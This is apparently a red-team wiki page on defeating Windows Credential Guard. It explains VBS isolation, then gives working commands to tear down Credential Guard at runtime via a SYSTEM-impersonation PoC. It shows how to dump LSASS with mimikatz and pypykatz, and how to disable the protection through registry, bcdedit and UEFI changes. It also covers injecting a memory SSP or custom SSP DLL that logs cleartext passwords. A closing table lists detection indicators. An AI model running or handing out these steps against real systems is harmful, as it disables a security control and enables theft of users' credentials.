## Theory

### What Credential Guard is

Credential Guard (CG) is a [Virtualization-based Security (VBS)](/redteam/evasion/virtualization-based-security-vbs-bypass) feature that moves the most sensitive authentication secrets out of the reach of the normal operating system. On a VBS-enabled host, the Windows hypervisor splits execution into two **Virtual Trust Levels**:

* **VTL0 - the "normal world":** the ordinary Windows kernel and every user-mode process, including the `lsass.exe` you can see in Task Manager.
* **VTL1 - the "secure world" (Isolated User Mode, IUM):** a small, separately-signed set of processes called **trustlets**, isolated from VTL0 by the hypervisor using [SLAT/EPT](/redteam/evasion/virtualization-based-security-vbs-bypass/hypervisor-protected-code-integrity-hvci-bypass) memory partitioning. Even a fully-compromised VTL0 kernel cannot read VTL1 memory.

When Credential Guard is active, LSASS is split in two:

* **`lsass.exe` in VTL0** - the broker you can see and open a handle to. It still orchestrates authentication, but it no longer holds the derived secrets. A dashed-outline `LsaIso.exe` placeholder process is visible in VTL0, but it is just a stub - the real code and data live in VTL1.
* **`LsaIso.exe` in VTL1** (the *Isolated LSA*) - the trustlet that actually stores and uses the secrets. It communicates with the VTL0 LSASS over a secure, hypervisor-mediated channel.

<Figure src="/assets/credential-guard-trustlet.png">Credential Guard is a trustlet in VBS - LsaIso.exe has a VTL0 placeholder (dashed) while its real code runs in VTL1 alongside the secure kernel</Figure>

At the crypto level, when VTL0 `lsass.exe` receives a user's password, it forwards it to the `LsaIso.exe` trustlet in VTL1. The trustlet calls `EncryptPassword()`, then `DoCrypto()` which uses cryptographic keys sealed to the TPM by the secure kernel. Only an **opaque blob** - useless outside VTL1 - flows back to VTL0. The NT hash, the Kerberos keys and the plaintext never touch VTL0 memory at rest.

<Figure src="/assets/credential-guard-principle.png">Credential Guard principle - the password enters VTL1 where it is encrypted using TPM-sealed keys, only an opaque blob returns to VTL0 lsass.exe</Figure>

### What Credential Guard does and does not protect

This distinction is the hinge for every technique on this page.

**Protected - derived secrets at rest in the isolated store:**

* NTLM password hashes (NT/`NtOwfPassword`)
* Kerberos long-term keys and TGT session keys
* Cached domain logon verifiers (domain-cached credentials)

With CG on, these never materialise in VTL0 `lsass.exe` memory. A conventional [LSASS dump](/redteam/credentials/os-credentials/windows-and-active-directory/lsass) (`comsvcs.dll`, ProcDump, MiniDumpWriteDump, mimikatz `sekurlsa::logonpasswords`) therefore comes back with the secret fields blanked - the attacker only recovers encrypted proxy blobs that are useless outside VTL1.

**Not protected - because CG was never designed to hide them:**

* **Plaintext credentials in transit at authentication time.** A [Security Support Provider (SSP)](/redteam/persistence/windows/lsa/security-support-provider-dlls) loaded into the VTL0 LSASS still sees the cleartext as it flows through the logon path. CG protects the *stored, derived* secret, not the credential while it is being presented.
* **Secrets for logons that happen while CG is off.** Isolation is enforced at the moment the secret is created. Anything created before CG was enabled, or after it is torn down, lives in VTL0.
* **Local SAM secrets**, [DPAPI](/redteam/credentials/os-credentials/windows-and-active-directory/dpapi-protected-secrets)-protected material, browser/credential-manager stores, and network authentication exchanges (which can still be relayed, roasted, or captured).

Because of this, "bypassing Credential Guard" splits into two distinct goals: **disabling it** so the secrets fall back into VTL0, or **circumventing it** by capturing credentials on a path it does not cover.

### The runtime-teardown primitive

Classically, turning Credential Guard off meant changing configuration (`LsaCfgFlags`, UEFI variables, Device Guard policy) and **rebooting** - persistent, but slow and loud.

Research published in the [`CredGuardRuntimeShutdown`](https://github.com/S12cybersecurity/CredGuardRuntimeShutdown) PoC (Win11 24H2, build 26200) demonstrates a **reboot-less, driver-less** teardown. Inside the `LsaIso.exe` trustlet runs a thread, **`DisableCredGuardWaitThread`**, that blocks waiting on a named kernel event object:

```
\LSA_ISO_DISABLE_CREDENTIAL_GUARD
```

Signalling that event wakes the thread, which tears down the Credential Guard credential provider **at runtime**. No kernel driver and no reboot are involved - the OS simply stops isolating new credentials for the remainder of the boot.

Two properties make this an attacker primitive rather than a mere curiosity:

<Callout type="info">

**Who can signal it.** The event's DACL grants `EVENT_MODIFY_STATE` only to **SYSTEM**. From a high-integrity administrator process that already holds `SeDebugPrivilege`, SYSTEM is reachable by stealing and impersonating a SYSTEM token (classically `winlogon.exe`) via `OpenProcessToken` → `DuplicateTokenEx` → `ImpersonateLoggedOnUser` - see [token impersonation](/redteam/privilege-escalation/windows/abusing-tokens).

</Callout>

<Callout type="warning">

**Only *new* sessions are exposed.** Teardown does **not** reach back into VTL1 and surface credentials that were isolated earlier. Sessions that existed before the shutdown stay protected in VTL1. To obtain a usable secret, the attacker must force a **fresh logon** *after* the teardown - that session's NT hash then materialises in plaintext in ordinary VTL0 `lsass.exe` memory.

</Callout>

## Practice

### Enumeration

Before attempting any bypass, verify whether Credential Guard is actually active on the target.

<Tabs items={['PowerShell', 'WMI', 'Mimikatz']}>
<Tab value="PowerShell">

```powershell
# Check VBS and Credential Guard status
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | Select-Object -Property SecurityServicesRunning, VirtualizationBasedSecurityStatus
```

`SecurityServicesRunning` contains `1` if Credential Guard is active, `2` if HVCI is active.

</Tab>

<Tab value="WMI">

```powershell
# From cmd or PowerShell
wmic /namespace:\\root\Microsoft\Windows\DeviceGuard path Win32_DeviceGuard get SecurityServicesRunning,VirtualizationBasedSecurityStatus /value
```

</Tab>

<Tab value="Mimikatz">

```bash
# Mimikatz will report "Credential Guard may be running" when secrets are isolated
sekurlsa::logonpasswords
```

If Credential Guard is on, the NT hash and password fields come back empty or show encrypted proxy blobs instead of the real secrets.

</Tab>
</Tabs>

### Runtime teardown (reboot-less)

The runtime teardown disables Credential Guard on the fly by signaling the `\LSA_ISO_DISABLE_CREDENTIAL_GUARD` kernel event as SYSTEM. No driver, no reboot. Credentials from sessions created **after** the teardown materialise in plain VTL0 LSASS memory and can be dumped normally.

<Tabs items={['CredGuardRuntimeShutdown']}>
<Tab value="CredGuardRuntimeShutdown">

[CredGuardRuntimeShutdown](https://github.com/S12cybersecurity/CredGuardRuntimeShutdown) (C) performs the full chain: impersonate SYSTEM via `winlogon.exe`, signal the disable event, wait for teardown, create a test logon session, then scan LSASS for the NT hash.

```bash
# Compile (MinGW)
gcc -o credguard_poc.exe credguard_poc.c -lntdll -lwincrypt -ldbghelp

# Run from a high-integrity admin shell
# <user> <domain> <password> - account must exist on the target
credguard_poc.exe sshuser . password
```

<Callout type="info">

After a successful teardown, `SecurityServicesRunning` drops from `[1, 2]` to `[2]`. The named event is consumed: a second run on the same boot returns `STATUS_OBJECT_NAME_NOT_FOUND (0xC0000034)`, meaning CG is already off.

</Callout>

<Callout type="warning">

The `+0x1F6` NT-hash offset inside `MSV1_0_PRIMARY_CREDENTIAL` is specific to **Win11 24H2 build 26200**. Verify the struct layout with a kernel debugger on other builds, or fall back to the minidump written at `C:\Windows\Temp\lsass_post.dmp`.

</Callout>

Once Credential Guard is torn down, credentials from new logon sessions can be recovered with any standard [LSASS dumping technique](/redteam/credentials/os-credentials/windows-and-active-directory/lsass):

```bash
# Offline analysis of the minidump
pypykatz lsa minidump C:\Windows\Temp\lsass_post.dmp

# Or with Mimikatz on the live process
sekurlsa::logonpasswords
```

</Tab>
</Tabs>

### Persistent disable (reboot required)

The classic approach removes the Credential Guard configuration so it does not start on the next boot. This requires a reboot, which is louder but persistent across boots.

<Tabs items={['Registry', 'Mountvol + bcdedit', 'Group Policy']}>
<Tab value="Registry">

Disable Credential Guard via registry, then reboot.

```powershell
# Disable Credential Guard
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v LsaCfgFlags /t REG_DWORD /d 0 /f

# Reboot
shutdown /r /t 0
```

</Tab>

<Tab value="Mountvol + bcdedit">

On UEFI-locked systems, the EFI variables that persist Credential Guard must also be deleted.

```powershell
# Disable via registry (same as above)
reg add "HKLM\SYSTEM\CurrentControlSet\Control\LSA" /v LsaCfgFlags /t REG_DWORD /d 0 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DeviceGuard" /v EnableVirtualizationBasedSecurity /t REG_DWORD /d 0 /f

# Remove the UEFI lock
mountvol X: /s
copy %WINDIR%\System32\SecConfig.efi X:\EFI\Microsoft\Boot\SecConfig.efi /Y
bcdedit /create {0cb3b571-2f2e-4343-a879-d86a476d7215} /d "DebugTool" /application osloader
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} path "\EFI\Microsoft\Boot\SecConfig.efi"
bcdedit /set {bootmgr} bootsequence {0cb3b571-2f2e-4343-a879-d86a476d7215}
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} loadoptions DISABLE-LSA-ISO
bcdedit /set {0cb3b571-2f2e-4343-a879-d86a476d7215} device partition=X:

# Reboot - confirm the UEFI prompt to disable Credential Guard
shutdown /r /t 0
```

</Tab>

<Tab value="Group Policy">

If the target is domain-joined and you have GPO write access:

```
Computer Configuration > Administrative Templates > System > Device Guard
  > Turn On Virtualization Based Security
    > Credential Guard Configuration: Disabled
```

After the GPO refreshes (`gpupdate /force`), a reboot disables Credential Guard.

</Tab>
</Tabs>

### Circumventing Credential Guard (without disabling it)

Credential Guard only protects derived secrets **at rest** in VTL1. Credentials can still be captured on paths it was never designed to cover.

#### In-memory SSP injection

A malicious [Security Support Provider](/redteam/persistence/windows/lsa/security-support-provider-dlls) loaded into the VTL0 `lsass.exe` sees **plaintext credentials as they flow through the logon path**, before they ever reach VTL1.

<Tabs items={['Mimikatz (memssp)', 'Custom SSP DLL']}>
<Tab value="Mimikatz (memssp)">

[Mimikatz](https://github.com/gentilkiwi/mimikatz) can inject a memory-only SSP into LSASS that logs all future authentications to `C:\Windows\System32\mimilsa.log`.

```bash
privilege::debug
misc::memssp
```

Any subsequent interactive logon on the host writes the cleartext password to `mimilsa.log`, regardless of Credential Guard.

</Tab>

<Tab value="Custom SSP DLL">

A custom SSP DLL can be compiled and loaded into LSASS to intercept credentials at authentication time. See the full walkthrough and code on the [Security Support Provider DLLs](/redteam/persistence/windows/lsa/security-support-provider-dlls) page.

```powershell
# Register and load a custom SSP at runtime (no reboot)
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class SSP {
    [DllImport("secur32.dll", SetLastError = true)]
    public static extern int AddSecurityPackage(string pszPackageName, IntPtr pOptions);
}
"@
[SSP]::AddSecurityPackage("C:\path\to\custom_ssp.dll", [IntPtr]::Zero)
```

</Tab>
</Tabs>

#### Other credential capture paths

Credential Guard does not protect these vectors, which can be used to harvest credentials even while VTL1 isolation is fully active:

* **Keylogging / credential prompts** - capture passwords at the UI layer before they reach LSASS.
* **Network authentication capture** - [NTLM relay](/ad/movement/ntlm/relay), [Kerberoasting](/ad/movement/kerberos/roasting/kerberoast), [AS-REP roasting](/ad/movement/kerberos/roasting/asreproast) and [coerced authentication](/redteam/credentials/mitm-and-coerced-auths) sidestep the isolated store entirely.
* **[DPAPI](/redteam/credentials/os-credentials/windows-and-active-directory/dpapi-protected-secrets)** and **[SAM/LSA secrets](/redteam/credentials/os-credentials/windows-and-active-directory/sam-and-lsa-secrets)** are not protected by Credential Guard.

## Detection

| Indicator | Source |
|---|---|
| `NtOpenEvent` on `\LSA_ISO_DISABLE_CREDENTIAL_GUARD` | ETW Security Auditing event **4656** (Audit Kernel Object) |
| `OpenProcess(winlogon, …)` from a non-SYSTEM process | Sysmon event **10** (ProcessAccess) |
| `Win32_DeviceGuard.SecurityServicesRunning` drops from `[1, 2]` to `[2]` | WMI polling |
| `LogonUserA` followed by `OpenProcess(lsass, VM_READ)` in the same process | EDR behavioural correlation |
